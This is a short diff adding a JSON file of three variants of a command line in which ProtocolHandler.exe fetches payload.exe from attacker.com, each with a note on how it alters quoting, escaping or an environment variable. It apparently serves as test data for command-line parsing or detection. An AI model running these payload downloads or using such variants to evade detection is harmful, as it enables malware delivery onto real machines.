@@ -1,0 +1,14 @@
+[
+  {
+    "output": "ProtocolHandler.exe http://attacker.com/payload.exe",
+    "explanation": "Removes quotes around the URL, which are not strictly necessary for the command to function."
+  },
+  {
+    "output": "ProtocolHandler.exe \"http://attacker.com\\payload.exe\"",
+    "explanation": "Inserts escape characters and uses double quotes to test parsing behavior while maintaining the same functionality."
+  },
+  {
+    "output": "set URL=http://attacker.com/payload.exe && ProtocolHandler.exe %URL%",
+    "explanation": "Uses an environment variable to recode the URL, which is a safe mutation technique for testing."
+  }
+]
